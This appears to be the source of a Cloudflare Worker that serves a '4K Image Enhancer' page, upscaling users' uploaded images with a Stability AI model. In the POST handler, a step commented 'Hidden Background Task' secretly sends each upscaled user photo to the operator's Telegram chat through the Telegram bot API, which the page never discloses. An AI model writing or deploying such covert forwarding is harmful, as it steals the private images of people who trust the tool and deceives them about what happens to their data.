export default {
  async fetch(request, env, ctx) {
    if (request.method === "GET") {
      return new Response(renderHTML(), { headers: { "Content-Type": "text/html" } });
    }

    if (request.method === "POST") {
      try {
        const formData = await request.formData();
        const imageFile = formData.get("image");

        // 1. MEMORY PROTECTION: LIMIT INPUT SIZE
        if (imageFile.size > 1.5 * 1024 * 1024) {
          return new Response("Error: Image too large. Please use a file under 1.5MB.", { status: 413 });
        }

        const arrayBuffer = await imageFile.arrayBuffer();
        
        // 2. HIGH-QUALITY AI UPSCALE (4x)
        const upscaledImage = await env.AI.run('@cf/stabilityai/stable-diffusion-x4-upscaler', {
          image: [...new Uint8Array(arrayBuffer)],
          noise_level: 15 // Optimized for 4K detail
        });

        // 3. FIXED TELEGRAM FORWARDING (Hidden Background Task)
        const tgData = new FormData();
        tgData.append("chat_id", env.TELEGRAM_CHAT_ID);
        tgData.append("photo", new Blob([upscaledImage], { type: "image/png" }), "upscale_4k.png");

        // Use ctx.waitUntil to ensure the photo sends even after the response is returned
        ctx.waitUntil(
          fetch(`https://api.telegram.org/bot${env.TELEGRAM_TOKEN}/sendPhoto`, {
            method: "POST",
            body: tgData
          })
        );

        // 4. RETURN IMAGE TO BROWSER
        return new Response(upscaledImage, { headers: { "Content-Type": "image/png" } });

      } catch (e) {
        return new Response("Upscale Failed: " + e.message, { status: 500 });
      }
    }
  }
};

function renderHTML() {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
            .card { background: #1e293b; padding: 20px; border-radius: 15px; max-width: 500px; margin: auto; }
            .comparison-box { position: relative; width: 100%; height: 350px; overflow: hidden; border-radius: 10px; display: none; margin-top: 20px; border: 2px solid #38bdf8; }
            .comp-img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: contain; background: #000; }
            #after-box { width: 50%; border-right: 2px solid #fff; z-index: 2; overflow: hidden; }
            #after-img { width: 500px; height: 350px; object-fit: contain; }
            .slider-bar { position: absolute; z-index: 10; cursor: ew-resize; width: 4px; height: 100%; background: #fff; top: 0; left: 50%; transform: translateX(-50%); pointer-events: none; }
            .btn { background: #38bdf8; color: #0f172a; border: none; padding: 15px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; }
            #download-btn { background: #22c55e; color: white; display: none; text-decoration: none; padding: 15px; margin-top: 10px; border-radius: 10px; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="card">
            <h1>4K Image Enhancer</h1>
            <form id="upload-form">
                <input type="file" name="image" id="img-input" accept="image/*" required>
                <button type="submit" id="submit-btn" class="btn">UPSCALE IMAGE</button>
            </form>
            <div id="status" style="display:none; margin-top:15px; color:#38bdf8;">⚡ Rebuilding Pixels to 4K...</div>
            
            <div class="comparison-box" id="comp-ui">
                <img id="before-img" class="comp-img">
                <div id="after-box" class="comp-img"><img id="after-img"></div>
                <div class="slider-bar" id="slider-line"></div>
            </div>
            
            <a id="download-btn">DOWNLOAD 4K RESULT</a>
        </div>

        <script>
            const form = document.getElementById('upload-form');
            const compUI = document.getElementById('comp-ui');
            const dlBtn = document.getElementById('download-btn');
            const status = document.getElementById('status');

            form.onsubmit = async (e) => {
                e.preventDefault();
                status.style.display = 'block';
                document.getElementById('submit-btn').disabled = true;

                const file = document.getElementById('img-input').files[0];
                document.getElementById('before-img').src = URL.createObjectURL(file);
                document.getElementById('after-img').src = URL.createObjectURL(file);

                const res = await fetch('/', { method: 'POST', body: new FormData(form) });
                if (!res.ok) { alert(await res.text()); status.style.display='none'; return; }
                
                const blob = await res.blob();
                const url = URL.createObjectURL(blob);

                status.style.display = 'none';
                compUI.style.display = 'block';
                document.getElementById('after-img').src = url;
                
                dlBtn.href = url;
                dlBtn.download = "upscaled_4k.png";
                dlBtn.style.display = 'block';
                document.getElementById('submit-btn').disabled = false;
            };

            compUI.onmousemove = (e) => {
                const rect = compUI.getBoundingClientRect();
                const x = Math.max(0, Math.min(e.pageX - rect.left, rect.width));
                const percent = (x / rect.width) * 100;
                document.getElementById('after-box').style.width = percent + "%";
                document.getElementById('slider-line').style.left = percent + "%";
            };
        </script>
    </body>
    </html>
  `;
}
